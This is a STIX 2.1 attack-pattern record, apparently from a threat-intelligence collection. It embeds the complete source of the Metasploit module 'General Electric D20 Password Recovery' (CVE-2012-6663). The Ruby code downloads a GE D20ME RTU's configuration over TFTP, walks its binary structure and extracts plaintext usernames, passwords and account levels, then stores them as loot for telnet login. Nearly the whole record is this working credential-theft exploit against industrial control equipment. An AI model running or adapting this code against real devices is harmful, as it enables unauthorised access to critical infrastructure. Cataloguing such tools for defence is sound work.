{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93aa43e8-e8a2-4e92-9be5-44fe17fcd7f5",
    "created": "2024-08-14T16:31:27.889028Z",
    "modified": "2024-08-14T16:31:27.889031Z",
    "name": "General Electric D20 Password Recovery",
    "description": " The General Electric D20ME and possibly other units (D200?) feature TFTP readable configurations with plaintext passwords.  This module retrieves the username, password, and authentication level list. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/d20pass.rb",
            "external_id": "d20pass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6663"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module grabs the device configuration from a GE D20M* RTU and\n# parses the usernames and passwords from it.\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Rex::Ui::Text\n  include Rex::Proto::TFTP\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'General Electric D20 Password Recovery',\n      'Description'    => %q{\n        The General Electric D20ME and possibly other units (D200?) feature\n        TFTP readable configurations with plaintext passwords.  This module\n        retrieves the username, password, and authentication level list.\n      },\n      'Author'         => [ 'K. Reid Wightman <wightman[at]digitalbond.com>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2012-6663'],\n        ],\n      'DisclosureDate' => '2012-01-19'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(69),\n        Opt::RHOST('192.168.255.1'),\n        OptString.new('REMOTE_CONFIG_NAME', [true, \"The remote filename used to retrieve the configuration\", \"NVRAM\\\\D20.zlb\"])\n      ])\n  end\n\n  def setup\n    @rhost = datastore['RHOST']\n    @rport = datastore['RPORT'] || 69\n    @lport = datastore['LPORT'] || (1025 + rand(0xffff - 1025))\n    @lhost = datastore['LHOST'] || \"0.0.0.0\"\n    @rfile = datastore['REMOTE_CONFIG_NAME']\n  end\n\n  def cleanup\n    if @tftp_client and @tftp_client.respond_to? :complete\n      while not @tftp_client.complete\n        select(nil,nil,nil,1)\n        vprint_status \"Cleaning up the TFTP client ports and threads.\"\n        @tftp_client.stop\n      end\n    end\n  end\n\n  def rtarget(ip=nil)\n    if (ip or rhost) and rport\n      [(ip || rhost),rport].map {|x| x.to_s}.join(\":\") << \" \"\n    elsif (ip or rhost)\n      rhost\n    else\n      \"\"\n    end\n  end\n\n  # Retrieve the file\n  def retrieve\n    print_status(\"Retrieving file\")\n    @tftp_client = Rex::Proto::TFTP::Client.new(\n        \"LocalHost\" => @lhost,\n        \"LocalPort\" => @lport,\n        \"PeerHost\" => @rhost,\n        \"PeerPort\" => @rport,\n        \"RemoteFile\" => @rfile,\n        \"Action\" => :download\n    )\n    @tftp_client.send_read_request { |msg| print_tftp_status(msg) }\n    @tftp_client.threads do |thread|\n      thread.join\n    end\n    # Wait for GET to finish\n    while not @tftp_client.complete\n      select(nil, nil, nil, 0.1)\n    end\n    fh = @tftp_client.recv_tempfile\n    return fh\n  end\n\n  # Builds a big-endian word\n  def makeword(bytestr)\n    return bytestr.unpack(\"n\")[0]\n  end\n  # builds abi\n  def makelong(bytestr)\n    return bytestr.unpack(\"N\")[0]\n  end\n\n  # Returns a pointer.  We re-base the pointer\n  # so that it may be used as a file pointer.\n  # In the D20 memory, the file is located in flat\n  # memory at 0x00800000.\n  def makefptr(bytestr)\n    ptr = makelong(bytestr)\n    ptr = ptr - 0x00800000\n    return ptr\n  end\n\n  # Build a string out of the file.  Assumes that the string is\n  # null-terminated.  This will be the case in the D20 Username\n  # and Password fields.\n  def makestr(f, strptr)\n    f.seek(strptr)\n    str = \"\"\n    b = f.read(1)\n    if b != 0\n      str = str + b\n    end\n    while b != \"\\000\"\n      b = f.read(1)\n      if b != \"\\000\"\n        str = str + b\n      end\n    end\n    return str\n  end\n\n  # configuration section names in the file are always\n  # 8 bytes.  Sometimes they are null-terminated strings,\n  # but not always, so I use this silly helper function.\n  def getname(f, entryptr)\n    f.seek(entryptr + 12) # three ptrs then name\n    str = f.read(8)\n    return str\n  end\n\n  def leftchild(f, entryptr)\n    f.seek(entryptr + 4)\n    ptr = f.read(4)\n    return makefptr(ptr)\n  end\n\n  def rightchild(f, entryptr)\n    f.seek(entryptr + 8)\n    ptr = f.read(4)\n    return makefptr(ptr)\n  end\n\n  # find the entry in the configuration file.\n  # the file is a binary tree, with pointers to parent, left, right\n  # stored as 32-bit big-endian values.\n  # sorry for depth-first recursion\n  def findentry(f, name, start)\n    f.seek(start)\n    myname = getname(f, start)\n    if name == myname\n      return start\n    end\n    left = leftchild(f, start)\n    right = rightchild(f, start)\n    if name < myname\n      if left < f.stat.size and left != 0\n        res = findentry(f, name, leftchild(f, start))\n      else\n        res = nil # this should perolate up\n      end\n    end\n    if name > myname\n      if right < f.stat.size and right != 0\n        res = findentry(f, name, rightchild(f, start))\n      else\n        res = nil\n      end\n    end\n    return res\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # Parse the usernames, passwords, and security levels from the config\n  # It's a little ugly (lots of hard-coded offsets).\n  # The userdata starts at an offset dictated by the B014USERS config\n  # offset 0x14 (20) bytes.  The rest is all about skipping past the\n  # section header.\n  def parseusers(f, userentryptr)\n    f.seek(userentryptr + 0x14)\n    dstart = makefptr(f.read(4))\n    f.seek(userentryptr + 0x1C)\n    numentries = makelong(f.read(4))\n    f.seek(userentryptr + 0x60)\n    headerlen = makeword(f.read(2))\n    f.seek(userentryptr + 40) # sorry decimal\n    entrylen = makeword(f.read(2)) # sorry this is decimal\n    logins = Rex::Text::Table.new(\n      'Header' => \"D20 usernames, passwords, and account levels\\n(use for TELNET authentication)\",\n      'Indent' => 1,\n      'Columns' => [\"Type\", \"User Name\", \"Password\"])\n\n    0.upto(numentries -1).each do |i|\n      f.seek(dstart + headerlen + i * entrylen)\n      accounttype = makeword(f.read(2))\n      f.seek(dstart + headerlen + i * entrylen + 2)\n      accountname = makestr(f, dstart + headerlen + i * entrylen + 2)\n      f.seek(dstart + headerlen + i * entrylen + 2 + 22)\n      accountpass = makestr(f, dstart + headerlen + i * entrylen + 2 + 22)\n      if accountname.size + accountpass.size > 44\n        print_error(\"Bad account parsing at #{dstart + headerlen + i * entrylen}\")\n        break\n      end\n      logins <<  [accounttype,  accountname,  accountpass]\n      report_cred(\n        ip: datastore['RHOST'],\n        port: 23,\n        service_name: 'telnet',\n        user: accountname,\n        password: accountpass,\n        proof: accounttype\n      )\n    end\n    if not logins.rows.empty?\n      loot = store_loot(\n        \"d20.user.creds\",\n        \"text/csv\",\n        datastore['RHOST'],\n        logins.to_s,\n        \"d20_user_creds.txt\",\n        \"General Electric TELNET User Credentials\",\n        datastore['RPORT']\n      )\n      print_line logins.to_s\n      print_status(\"Loot stored in: #{loot}\")\n    else\n      print_error(\"No data collected\")\n    end\n  end\n\n  def parse(fh)\n    print_status(\"Parsing file\")\n    File.open(fh.path, 'rb') do |f|\n      used = f.read(4)\n      if used != \"USED\"\n        print_error \"Invalid Configuration File!\"\n        return\n      end\n      f.seek(0x38)\n      start = makefptr(f.read(4))\n      userptr = findentry(f, \"B014USER\", start)\n      if userptr != nil\n        parseusers(f, userptr)\n      else\n        print_error \"Error finding the user table in the configuration.\"\n      end\n    end\n  end\n\n  def run\n    fh = retrieve\n    parse(fh)\n  end\n\n  def print_tftp_status(msg)\n    case msg\n    when /Aborting/, /errors.$/\n      print_error [rtarget,msg].join\n    when /^WRQ accepted/, /^Sending/, /complete!$/\n      print_good [rtarget,msg].join\n    else\n      vprint_status [rtarget,msg].join\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-19"
}